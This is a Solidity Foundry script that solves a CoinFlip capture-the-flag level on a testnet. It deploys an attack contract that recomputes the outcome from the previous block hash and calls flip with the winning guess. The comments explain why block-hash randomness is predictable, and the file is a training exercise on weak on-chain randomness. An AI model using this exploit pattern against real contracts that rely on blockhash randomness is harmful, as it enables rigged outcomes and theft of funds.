// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {CoinFlip} from "../src/CoinFlip.sol";

// Our Instance address: https://sepolia.etherscan.io/address/0xb301e2bca2d30bc645024ed485ab694f689f4694

contract CoinFlipSolution is Script {
    // $ source .env      # This is to store the environmental variables in the shell session
    // $ forge script script/CoinFlip.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast --verify -vvvv
    // $ forge script script/CoinFlip.s.sol --tc CoinFlipSolution --rpc-url $SEPOLIA_RPC_URL --broadcast --verify -vvvv

    CoinFlip coinFlipInstance = CoinFlip(0xb301E2BcA2d30bc645024ed485ab694F689f4694);
    CoinFlipAttack attackContract = CoinFlipAttack(0xE71ECCdF545bfC2C6A8da15b1EA4022e0849661F);

    function run() external {
        // In this CTF, we will have to make more than one tx. So you need to deploy teh contract first, then
        // start interacting with it.
        // You can use our instance in this challenge, its address is after `importing`
        if (address(coinFlipInstance) == address(0)) {
            coinFlipInstance = _deployCoinFlipContract();
        }
        // We will simulate the attack by the second address in the .env file
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY_2");
        vm.startBroadcast(attackerPrivateKey);

        // - In the contract the guess is determined using the previous hash of teh block
        // - Since the all the info in the blockchain is public, so the numbers used to detemine the right guess
        // - We will deploy a contract that has a function `attack`, which calculates the right guess, then calls `flip` function
        // - Everytime we run `attack` function, we will first `flip` with teh right guess, so consecutiveWins will increase by 1
        // - Repeat calling attack till you reach to 10

        // We will deploy the attack contract, if we don't have one.
        // You can use our contract in your testing
        if (address(attackContract) == address(0)) {
            attackContract = new CoinFlipAttack(address(coinFlipInstance));
            console.log("CoinFlipAttack address:", address(attackContract));
        }
        console.log("consecutiveWins:", coinFlipInstance.consecutiveWins());
        attackContract.attack();
        console.log("consecutiveWins:", coinFlipInstance.consecutiveWins());

        vm.stopBroadcast();
    }

    function _getRightGuess() internal view returns (bool side) {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        side = coinFlip == 1 ? true : false;
    }

    function _deployCoinFlipContract() internal returns (CoinFlip) {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        CoinFlip coinFlipInstance = new CoinFlip();
        console.log("CoinFlip address:", address(coinFlipInstance));
        vm.stopBroadcast();
        return coinFlipInstance;
    }
}

contract CoinFlipAttack {
    CoinFlip coinFlipInstance;

    constructor(address target) {
        coinFlipInstance = CoinFlip(target);
    }

    // We will calculate the right guess, then we will call `flip` with the right value we got
    function attack() public {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        coinFlipInstance.flip(side);
    }
}
